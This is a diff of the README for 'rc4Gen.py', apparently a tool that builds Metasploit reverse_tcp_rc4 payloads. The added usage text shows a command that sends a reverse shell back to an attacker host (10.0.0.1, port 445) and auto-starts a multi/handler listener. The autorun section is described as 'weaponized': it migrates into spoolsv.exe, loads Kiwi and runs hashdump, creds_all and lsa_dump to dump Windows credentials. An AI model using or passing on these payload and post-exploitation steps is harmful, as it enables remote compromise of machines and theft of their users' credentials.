@@ -34,8 +34,28 @@ Default Values:
     
 ***
 Usage(CLI):
+    
+    Usage: python rc4Gen.py --lhost <OPTIONS>
+    Example: python rc4Gen.py --lhost 10.0.0.1 --lport=445 --pass=Password123 --verbose=on --listener=off
+    
+     Tips:
+     If LHOST is not defined the Wizard menu will be launched.
 
-    python rc4Gen.py --lhost=192.168.1.18 --lport=447 --verbose=on --listener=off
+
+	 --lhost=<> This will define the local host used for the reverse_tcp_rc4 payload.
+
+	 --lhost=<443> is default, this value will define the local port used for the reverse_tcp_rc4 payload.
+
+	 --pass=<rc4M4g1c> is default, this value will define the RC4PASSWORD used for the reverse_tcp_rc4 payload.
+
+	 --verbose=[OFF] is default, this will copy payload to Clipboard.
+
+	 --verbose=[ON] is not default, this will print payload to STDOUT.
+
+	 --listener[ON] is default, this will automatically launch the corresponding MSF Multi/Handler.
+
+	 --listener[OFF] is not default, this will NOT launch MSF multi/handler.
+
 ***
 Usage(Wizard):
 
@@ -100,6 +120,9 @@ Usage(Wizard):
         ...
 ***
 Autorun Script:
+    
+    The Multi/Handler listener is weaponized to automatically migrate into the                
+    spoolsv.exe process, load Kiwi, run sysinfo, hashdump, creds_all and lsa_dump.
 
     migrate -N spoolsv.exe
     load kiwi
